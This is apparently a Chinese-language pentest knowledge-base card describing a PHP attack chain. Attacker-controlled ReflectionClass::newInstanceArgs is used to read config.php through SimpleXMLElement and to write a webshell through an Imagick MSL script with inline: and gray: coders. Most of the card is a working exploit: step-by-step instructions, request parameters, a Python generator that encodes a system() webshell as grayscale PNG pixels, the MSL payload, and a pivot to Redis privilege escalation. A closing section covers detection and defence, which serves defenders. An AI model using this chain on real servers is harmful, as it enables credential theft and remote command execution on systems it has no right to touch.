---
id: web-php-reflectionclass-newinstanceargs-imagick-msl-webshell
title: 'PHP ReflectionClass::newInstanceArgs 任意类实例化：SimpleXMLElement 读文件 + Imagick MSL gray: 写 webshell'
type: scenario
domain: web
path: web/php/rce
technique: php-reflect-newinstanceargs-imagick-msl-write
tags:
- php
- rce
- reflection
- imagick
- msl
- simplexml
- arbitrary-file-write
- webshell
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-06'
verification:
  verified_by: verifier-V118
  verified_at: '2026-11-06T01:51:26+08:00'
  notes: '已对照原文核对；ReflectionClass/newInstanceArgs 可控、SimpleXMLElement 第三参读文件、Imagick MSL inline:+gray: 写 shell 链一致；PoC 未在本机执行'
url: /docs/web/php/rce/web-php-reflectionclass-newinstanceargs-imagick-msl-webshell/
draft: false
kb_aliases:
- 任意类实例化注入
- ReflectionClass newInstanceArgs
- Imagick MSL 任意写
- 'gray: 写文件'
- SimpleXMLElement 读文件
- PHP 类实例化绕过
---

## 一句话结论

当 PHP 应用把用户可控的类名和构造参数传给 `ReflectionClass::newInstanceArgs()` 时，攻击者可以实例化任意内置类：用 `SimpleXMLElement` 的第三个参数把 `data` 当文件名读取本地文件（如 `config.php`），再用 `Imagick` 的 MSL 脚本配合 `inline:` 与 `gray:` 伪协议把任意字节写入 Web 目录，落成 webshell 获得 www-data RCE。

## 原理

- **任意类实例化**：`ReflectionClass($name)->newInstanceArgs($args)` 等价于 `new $name(...$args)`。若 `$name` 与 `$args` 都来自请求且没有类名/参数白名单，攻击者就能用任意内置类的构造函数做文件、网络、图像等操作，不需要反序列化链。
- **SimpleXMLElement 读文件**：构造函数签名 `__construct(string $data, int $options = 0, bool $dataIsURL = false, ...)`。第三个参数为 `true` 时，`$data` 被当作文件名/URL 读取并解析为 XML；攻击者把 `config.php` 作为文件名传入，解析成功或报错回显都可能带出文件内容，从而拿到配置里的密钥/数据库口令。
- **Imagick 构造函数的字符串入口**：`Imagick::__construct()` 接受文件名/URL/图像描述字符串。ImageMagick 的 MSL（Magick Scripting Language）允许在 XML 中执行 `read`/`write` 等操作；即使 PHP 侧禁用了危险 delegate（如 `url:`、`ephemeral:`），MSL 与 `inline:`/`gray:` 伪协议仍可能可用。
- **`inline:` 读入**：`inline:data:image/png;base64,...` 让 ImageMagick 直接从 data URI 解码图像，不需要落地临时文件。
- **`gray:` 原样写出**：`gray:` 编码器把图像的灰度像素按每像素 1 字节写出。攻击者先构造一张 8-bit 灰度 PNG，使其像素值序列等于目标 webshell 的字节序列；MSL 读入该 PNG 后用 `gray:` 写到目标路径，落盘文件与原 webshell 字节流完全一致。
- **组合链**：类实例化注入拿到“任意文件读 + 任意文件写”原语；读配置拿凭据，写 Web 目录拿命令执行；后续可用配置中的 Redis 凭据继续提权（见关联卡片）。
- **成立前提**：`ReflectionClass`/`newInstanceArgs` 的类名与参数可控；`SimpleXML` 与 `Imagick` 扩展存在；`open_basedir`/`disable_functions` 未限制；Web 目录可写；ImageMagick 的 MSL 未被 policy.xml 禁用。

## 触发条件

- 应用存在 `ReflectionClass($userClass)->newInstanceArgs($userArgs)` 或等价的动态构造模式，且未做类名/参数白名单。
- PHP 启用 `SimpleXML`、`Imagick` 扩展；`display_errors=On` 或错误日志/响应可被攻击者看到。
- `open_basedir` 为空或包含目标路径；`disable_functions` 未禁用相关函数；Web 根目录对 PHP 进程可写。
- ImageMagick 的 MSL coder 与 `inline:`/`gray:` 伪协议未被策略禁用。
- 目标配置文件内容可被 XML 解析，或解析错误能回显部分内容（否则 SimpleXMLElement 读取可能失败，需要换其他读文件类）。

## 利用步骤

1. 信息收集：访问 `phpinfo` 确认 Imagick/SimpleXML/Phar/SQLite3 等扩展、`display_errors`、`disable_functions`、`open_basedir`。
2. 读配置：把类名设为 `SimpleXMLElement`，构造参数设为 `["config.php", 0, true]`；观察响应/报错，提取 `$secret`、数据库口令、Redis 口令等。
3. 构造载荷 PNG：把 webshell 字节序列作为 8-bit 灰度像素写入 PNG（宽=字节数、高=1，模式 L）。
4. 构造 MSL：`<read filename="inline:data:image/png;base64,<PNG>"/>` 读入，`<write filename="gray:/var/www/html/shell.php"/>` 写出。
5. 实例化 Imagick：把 MSL 字符串作为 `Imagick` 的构造参数，通过 `newInstanceArgs` 触发。
6. 验证：请求 `shell.php`，确认字节与载荷一致并执行命令；若写权限受限，换可写目录或先读配置找其他路径。
7. 后续：用读到的配置凭据访问内网服务（如本地 Redis），按 [[pentest-privilege-escalation-redis-module-load-root-exec]] 继续提权。

## PoC

```php
<?php
// 脆弱模式示意：类名与参数均来自请求
$class = $_POST['class'];
$args  = json_decode($_POST['args'], true);
$rc = new ReflectionClass($class);
$obj = $rc->newInstanceArgs($args);
```

```php
<?php
// 1) 读 config.php
// class=SimpleXMLElement&args=["config.php",0,true]

// 2) 写 webshell（MSL 作为 Imagick 构造参数）
$png = base64_encode(file_get_contents('/tmp/shell.png')); // 灰度像素=webshell字节
$msl = '<image><read filename="inline:data:image/png;base64,' . $png . '"/>'
     . '<write filename="gray:/var/www/html/shell.php"/></image>';
$args = [$msl];
// class=Imagick&args=[$msl]
```

```python
# 生成 8-bit 灰度 PNG：每个像素一个 webshell 字节
from PIL import Image
payload = b"<?php system($_GET['c']); ?>"
img = Image.new("L", (len(payload), 1))
img.putdata(list(payload))
img.save("shell.png")
```

MSL 载荷形态：

```xml
<image>
  <read filename="inline:data:image/png;base64,iVBORw0KGgo..."/>
  <write filename="gray:/var/www/html/shell.php"/>
</image>
```

PoC 依赖目标是否允许 MSL 与 `gray:`，未在本机执行；`SimpleXMLElement` 读文件需要目标内容可被 XML 解析或错误回显，实际成功率因环境而异。

## 变体与关联

- 变体：用 `Phar`、`SQLite3` 等其他内置类构造函数做文件操作或反序列化；用 `Imagick` 的其他 coder（`msl:`、`vid:`、`txt:`）读写。
- 变体：若 `SimpleXMLElement` 读取失败，可换 `SplFileObject`、`XMLReader`、`finfo` 等可实例化类，或利用报错/日志带出内容。
- 变体：Imagick 的 MSL 也可用 `write` 直接写 PHP 文件（不经灰度编码），但 `gray:` 的优势是能精确控制字节，避免图像编码器添加头/压缩。
- 关联卡片：[[web-php-rce-variable-class-function-call-reflection]]（可变类/函数调用与 ReflectionClass __toString）、[[web-php-deserialization-phar-upload-jpg-wakeup-eval]]（Phar 反序列化）、[[web-php-file-inclusion-filter-chain-fileless-rce]]（PHP 过滤器链无文件 RCE）、[[pentest-privilege-escalation-redis-module-load-root-exec]]（读配置后 Redis 模块提权）。
- 注意：MSL 能否使用取决于 ImageMagick 版本与 `policy.xml`；生产环境常见 `<policy domain="coder" rights="none" pattern="MSL"/>` 或禁用 `inline:`/`gray:`。

## 检测与防御

- 防御：禁止把用户输入传给 `ReflectionClass`/`newInstanceArgs`/`new $class`；如必须动态构造，使用严格的类名白名单与构造参数类型/范围校验。
- 防御：在 `php.ini` 设置 `open_basedir`、`disable_functions`（含 `system`/`exec`/`passthru` 等），关闭 `display_errors`；Web 目录对 PHP 进程只读（上传目录除外）。
- 防御：用 ImageMagick `policy.xml` 禁用 MSL 与不必要的 coder（`<policy domain="coder" rights="none" pattern="MSL"/>`），禁用 `inline:`/`gray:`/`url:` 等伪协议；升级 ImageMagick。
- 检测：PHP 错误日志中出现 `ReflectionClass`、`newInstanceArgs`、`SimpleXMLElement`、`Imagick` 相关异常；Web 目录出现新的 PHP 文件；请求体包含 `MSL`、`inline:data:image`、`gray:` 等特征；对 `ReflectionClass` 动态调用的代码审计规则。
- 检测：文件完整性监控 Web 根目录；对上传/写入目录做只读挂载与定期 diff；WAF 拦截含 MSL/`gray:`/`inline:` 的请求体。
- 响应：隔离主机、删除 webshell、检查同目录其他文件、轮换配置中的数据库/Redis/API 凭据、修复动态类构造入口。
